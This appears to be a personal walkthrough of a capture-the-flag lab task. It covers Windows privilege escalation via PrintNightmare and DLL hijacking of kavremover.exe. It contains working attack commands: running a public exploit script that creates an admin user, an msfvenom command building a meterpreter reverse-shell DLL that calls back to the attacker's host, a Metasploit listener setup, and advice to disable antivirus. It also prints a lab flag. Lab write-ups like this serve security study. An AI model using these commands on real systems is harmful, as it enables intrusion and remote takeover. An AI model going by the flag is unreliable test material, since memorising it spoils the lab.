Now that we have performed all the enumeration and situational awareness, we can move on to privilege escalation. Looking through our enumeration steps, you may notice a unique application connected to a scheduled task on the endpoint. We can attempt a DLL hijack on this application to escalate privileges, then set up persistence on the endpoint.

From the MITRE ATT&CK framework, DLL Hijacking is defined as *"Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. [[1]](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution."* The AT&CK Technique ID is [T1574](https://attack.mitre.org/techniques/T1574/).  

To utilize DLL Hijacking for privilege escalation, we will need to research the application and known vulnerabilities and DLLs and find a DLL not present on the system we have write access to.  

DLL Hijacking can also be used for persistence, as we will see later in the next task. This process is much easier than the previous one as we can use process monitoring tools like ProcMon and ProcessHacker2 to monitor for DLLs and their locations that can take over. The DLL persistence works by running the DLL with the application every time the system restarts or our connection is interrupted. This can be an application we put onto the system or an application already present that we exploit.  

Steps taken to perform DLL hijacking are outlined below.

1. Identify vulnerable application and location
2. Identify applications PID
3. Identify vulnerable DLLs that can be hijacked
4. Use MSFVenom or other payload creation tools to create a malicious DLL
5. Replace the original DLL with the malicious DLL
6. Profit

To begin escalating privileges with DLL Hijacking, we need to identify an application and scheduled task that we can target; this is covered in the previous two tasks. Once we have identified our target, we can use the power of Google to search for potential vulnerable DLLs associated with the application as we can not use tools like ProcMon to make the process easier.  

By googling, `<application> DLL Hijacking`, we can see several articles and blog posts that can lead us in the right direction and research the application for us.

If there is not any research on the application available, say a proprietary application. You can attempt to download the application from the server or find an identical copy on the internet for download that will allow you to search for vulnerable DLLs on your local machine. If you decide to take this approach, skip to the next task and complete the steps with ProcMon before returning to this task and exploiting the vulnerable DLL.


---

# Your job

## Privilege Escalation

Use a new vulnerability called `Print Nightmare` which was released in June 2021.
CVE-2021-34527, or PrintNightmare, is a vulnerability in the Windows Print Spooler that allows for a low priv user to escalate to administrator on a local box or on a remote server. More [info](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html).

- Check if the system is likely to be vulnerable.
	- Open the `services.msc` and check if the “Print Spooler” service is running.
	
		![[Task 43 - WERE TAKING OVER THIS DLL!-20241119134107843.webp]]
		It's vulnerable.
	- Check the updates on the system, this can be done via PowerShell:
		`wmic qfe list`
		
		![[Task 43 - WERE TAKING OVER THIS DLL!-20241119134419904.webp]]
		The results show the last update on this system was done on 11/11/2020 which means it is likely to be vulnerable!

- Download the exploit from github to the attcking machine.
	`git clone https://github.com/calebstewart/CVE-2021-1675`

- Copy the `CVE-2021-1675.ps1` file to PC-FILESRV01. 

> [!tip]
> If you are using xfreerdp with /drive:share,/home/kali/tools/ you can copy directly into the macHine.

- Run the script through a PowerShell window:
	PS C:\Users\watamet\Downloads> `Import-Module .\CVE-2021-1675.ps1`

- Run the exploit.
	PS C:\Users\watamet\Downloads> `Invoke-Nightmare -NewUser "abcuser" -NewPassword "Abc1234!"`
	![[Task 43 - WERE TAKING OVER THIS DLL!-20241119140151649.webp]]

> [!success]
> You have an admin user called **abcuser**. It’s useful to note that the password needs to be complex enough to pass the criteria, otherwise the user won’t be added!

- Confirm the user was added.
	PS C:\Users\watamet\Downloads> `net user abcuser`
	![[Task 43 - WERE TAKING OVER THIS DLL!-20241119140539946.webp]]

- Connect into the machine with that user, this can be either via evil-winrm or RDP.
- Go into the Administrators desktop and get the root flag.


---

## Flag after rooting PC-FILESRV01

- Go into the Administrators desktop and get the root's flag.
    
    HOLO{ee7e68a69829e56e1d5b4a73e7ffa5f0}
    
- Submit the user flag on Task 4, question 7.


---

## DLL Hijacking

### Identify vulnerable application and location

Enumerate the system and you'll find  a very interesting application (kavremover.exe) on `C:\Users\watamet\Applications\`, which is unusual path for program.


### Use MSFVenom or other payload creation tools to create a malicious DLL

Now you know the name of DLL that we want to hijack. So all you have to do is place the malicious DLL in that path and wait for victim to execute the application. There are several ways of creating this DLL. For this article we will use msfvenom to create the payload.

> [!warning]
> The application will be detected as a virus by the AntiVirus, so make sure you turn off AV or windows defender.

#### Creating a payload DLL

Kavremover is a 32 bit application, we will create a 32 bit payload dll with msfvenom. The syntax for creating one is:

```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACHING MACHINE IP> LPORT=4444 -f dll -o kavremoverENU.dll
```

**Explanation**

- **p** stands for payload. We supply the payload as windows/meterpreter/reverse_tcp.
- **LHOST** is the attacker IP. (Your Kali IP)
- **LPORT** is the attacker Port.
- **f** is for format, we choose dll
- **o** is for name of output file, we will use the same name as the one we need to hijack, kavremoverENU.dll.

#### Download the dll

Copy or download the kavremoverENU.dll file to the victim machine `C:\Users\watamet\Applications\` directory.

As you are using a RDP connection with a drive shared, simply copy the file.

### Exploiting the DLL

- On the attacking machine, run `metasploit` to receive sessions from the payload.

```
$ msfconsole

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ATTACKING MACHINE IP>
set LPORT 4444
exploit
```

- Start the kavremover application.

	The application didn’t start. That’s because of the malicious DLL, as it didn’t export necessary functions and exited the thread. But on the positive side, check the listener, you got a session.
	![[Task 43 - WERE TAKING OVER THIS DLL!-20241121133518095.webp]]

## Answer the questions

> [!question]
> What is the name of the vulnerable application found on PC-FILESRV01?
> `kavremover`

**Next step:** [[Task 44 - WERE TAKING OVER THIS DLL! Part II]]
